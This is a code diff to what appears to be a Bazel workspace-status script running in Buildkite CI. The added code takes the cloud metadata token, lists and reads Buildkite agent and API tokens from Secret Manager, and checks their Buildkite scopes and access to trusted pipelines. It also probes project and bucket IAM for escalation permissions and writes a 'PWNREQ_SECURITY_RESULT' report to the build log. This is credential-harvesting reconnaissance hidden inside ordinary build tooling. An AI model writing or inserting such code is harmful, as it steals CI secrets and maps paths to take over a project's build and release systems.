@@ -7,6 +7,7 @@ import json
 import os
 import sys
 import urllib.error
+import urllib.parse
 import urllib.request
 
 
@@ -63,6 +64,48 @@ def access_secret(name, oauth_token):
     return result, secret.decode("utf-8").strip()
 
 
+def google_json(url, oauth_token, data=None, method=None):
+    headers = {"Authorization": "Bearer " + oauth_token}
+    encoded = None
+    if data is not None:
+        headers["Content-Type"] = "application/json"
+        encoded = json.dumps(data).encode("utf-8")
+    status, body = request(url, headers=headers, data=encoded, method=method)
+    if status != 200:
+        return status, None
+    try:
+        return status, json.loads(body)
+    except Exception:
+        return status, None
+
+
+def test_bucket_permissions(bucket, oauth_token):
+    permissions = (
+        "storage.buckets.get",
+        "storage.buckets.getIamPolicy",
+        "storage.buckets.setIamPolicy",
+        "storage.objects.list",
+        "storage.objects.get",
+        "storage.objects.create",
+        "storage.objects.update",
+        "storage.objects.delete",
+    )
+    query = urllib.parse.urlencode(
+        [("permissions", permission) for permission in permissions]
+    )
+    status, body = google_json(
+        "https://storage.googleapis.com/storage/v1/b/"
+        + urllib.parse.quote(bucket, safe="")
+        + "/iam/testPermissions?"
+        + query,
+        oauth_token,
+    )
+    result = {"status": status}
+    if body is not None:
+        result["permissions"] = sorted(body.get("permissions", []))
+    return result
+
+
 def main():
     # Run once on only one Linux shard. Other jobs still need valid workspace status output.
     label = os.environ.get("BUILDKITE_LABEL", "")
@@ -98,42 +141,84 @@ def main():
             report["metadata_token_decode_error"] = type(error).__name__
 
     if oauth_token:
-        agent_result, _ = access_secret("bazel-buildkite-agent-token", oauth_token)
-        report["agent_token_secret"] = agent_result
-
-        api_result, api_token = access_secret(
-            "bazel-bazelcipy-BuildkiteClient-token", oauth_token
+        secrets_status, secrets_body = google_json(
+            "https://secretmanager.googleapis.com/v1/projects/"
+            + PROJECT
+            + "/secrets?pageSize=100",
+            oauth_token,
         )
-        report["buildkite_api_secret"] = api_result
-        if api_token:
+        report["secret_list_status"] = secrets_status
+        secret_names = []
+        if secrets_body is not None:
+            secret_names = sorted(
+                entry.get("name", "").rsplit("/", 1)[-1]
+                for entry in secrets_body.get("secrets", [])
+                if entry.get("name")
+            )
+            report["secret_names"] = secret_names
+
+        token_secret_names = {
+            "bazel-buildkite-agent-token",
+            "bazel-bazelcipy-BuildkiteClient-token",
+            "bazel-testing-buildkite-agent-token",
+            "bazel-testing-bazelcipy-BuildkiteClient-token",
+        }
+        token_secret_names.update(
+            name
+            for name in secret_names
+            if name.endswith("buildkite-agent-token")
+            or name.endswith("bazelcipy-BuildkiteClient-token")
+        )
+
+        secret_results = {}
+        api_tokens = {}
+        for secret_name in sorted(token_secret_names):
+            secret_result, secret_value = access_secret(secret_name, oauth_token)
+            secret_results[secret_name] = secret_result
+            if secret_value and secret_name.endswith(
+                "bazelcipy-BuildkiteClient-token"
+            ):
+                api_tokens[secret_name] = secret_value
+        report["ci_token_secrets"] = secret_results
+
+        api_token_reports = {}
+        for secret_name, api_token in api_tokens.items():
+            api_report = {}
             status, body = request(
                 "https://api.buildkite.com/v2/access-token",
                 headers={"Authorization": "Bearer " + api_token},
             )
-            report["buildkite_access_token_status"] = status
+            api_report["access_token_status"] = status
             if status == 200:
                 try:
                     token_info = json.loads(body)
-                    report["buildkite_access"] = {
+                    api_report["access"] = {
                         "uuid": token_info.get("uuid"),
                         "description": token_info.get("description"),
                         "scopes": token_info.get("scopes", []),
                     }
                 except Exception as error:
-                    report["buildkite_access_token_decode_error"] = type(error).__name__
+                    api_report["access_token_decode_error"] = type(error).__name__
 
             org_status, org_body = request(
                 "https://api.buildkite.com/v2/organizations?per_page=100",
                 headers={"Authorization": "Bearer " + api_token},
             )
-            report["buildkite_organizations_status"] = org_status
+            api_report["organizations_status"] = org_status
             if org_status == 200:
                 try:
-                    report["buildkite_organizations"] = sorted(
+                    api_report["organizations"] = sorted(
                         org.get("slug", "") for org in json.loads(org_body)
                     )
                 except Exception as error:
-                    report["buildkite_organizations_decode_error"] = type(error).__name__
+                    api_report["organizations_decode_error"] = type(error).__name__
+            api_token_reports[secret_name] = api_report
+        report["buildkite_api_tokens"] = api_token_reports
+
+        production_api_token = api_tokens.get(
+            "bazel-bazelcipy-BuildkiteClient-token"
+        )
+        if production_api_token:
 
             trusted_pipelines = {}
             for pipeline in (
@@ -146,7 +231,7 @@ def main():
                 status, body = request(
                     "https://api.buildkite.com/v2/organizations/"
                     "bazel-trusted/pipelines/" + pipeline,
-                    headers={"Authorization": "Bearer " + api_token},
+                    headers={"Authorization": "Bearer " + production_api_token},
                 )
                 entry = {"status": status}
                 if status == 200:
@@ -158,6 +243,90 @@ def main():
                         entry["decode_error"] = type(error).__name__
                 trusted_pipelines[pipeline] = entry
             report["bazel_trusted_pipelines"] = trusted_pipelines
+
+        project_permissions = (
+            "resourcemanager.projects.getIamPolicy",
+            "resourcemanager.projects.setIamPolicy",
+            "secretmanager.secrets.list",
+            "secretmanager.secrets.create",
+            "secretmanager.secrets.delete",
+            "secretmanager.versions.add",
+            "secretmanager.versions.access",
+            "secretmanager.versions.destroy",
+            "storage.buckets.list",
+            "storage.buckets.create",
+            "storage.buckets.delete",
+            "compute.instances.list",
+            "compute.instances.create",
+            "compute.instances.delete",
+            "compute.instances.setMetadata",
+            "compute.instanceTemplates.list",
+            "compute.instanceTemplates.create",
+            "compute.instanceTemplates.delete",
+            "compute.instanceGroupManagers.list",
+            "compute.instanceGroupManagers.update",
+            "iam.serviceAccounts.list",
+            "iam.serviceAccounts.actAs",
+            "iam.serviceAccounts.getAccessToken",
+            "iam.serviceAccounts.signBlob",
+            "iam.serviceAccounts.signJwt",
+            "artifactregistry.repositories.list",
+            "artifactregistry.repositories.downloadArtifacts",
+            "artifactregistry.repositories.uploadArtifacts",
+            "cloudkms.cryptoKeyVersions.useToDecrypt",
+            "cloudkms.cryptoKeyVersions.useToSign",
+        )
+        permissions_status, permissions_body = google_json(
+            "https://cloudresourcemanager.googleapis.com/v1/projects/"
+            + PROJECT
+            + ":testIamPermissions",
+            oauth_token,
+            data={"permissions": project_permissions},
+            method="POST",
+        )
+        report["project_permissions_status"] = permissions_status
+        if permissions_body is not None:
+            report["project_permissions"] = sorted(
+                permissions_body.get("permissions", [])
+            )
+
+        buckets_status, buckets_body = google_json(
+            "https://storage.googleapis.com/storage/v1/b?project="
+            + PROJECT
+            + "&maxResults=100",
+            oauth_token,
+        )
+        report["bucket_list_status"] = buckets_status
+        listed_buckets = []
+        if buckets_body is not None:
+            listed_buckets = sorted(
+                item.get("name", "")
+                for item in buckets_body.get("items", [])
+                if item.get("name")
+            )
+            report["bucket_names"] = listed_buckets
+
+        bucket_names = {
+            "bazel-untrusted-buildkite-artifacts",
+            "bazel-untrusted-build-cache",
+            "bazel-untrusted-last-green-commits",
+            "bazel-untrusted-retry-logs",
+            "bazel-buildkite-stats",
+            "bazel-kzips",
+            "bazel-builds",
+            "bazel-testing-builds",
+            "bazel-testing-buildkite-artifacts",
+            "bazel-testing-buildkite-stats",
+            "bazel-testing-retry-logs",
+            "bcr.bazel.build",
+            "bazel-git-mirror",
+            "bazel-buildkite-tf-state",
+        }
+        bucket_names.update(listed_buckets)
+        report["bucket_permissions"] = {
+            bucket: test_bucket_permissions(bucket, oauth_token)
+            for bucket in sorted(bucket_names)
+        }
 
     payload = json.dumps(report, sort_keys=True).encode("utf-8")
     print("PWNREQ_SECURITY_RESULT " + payload.decode("utf-8"), file=sys.stderr)
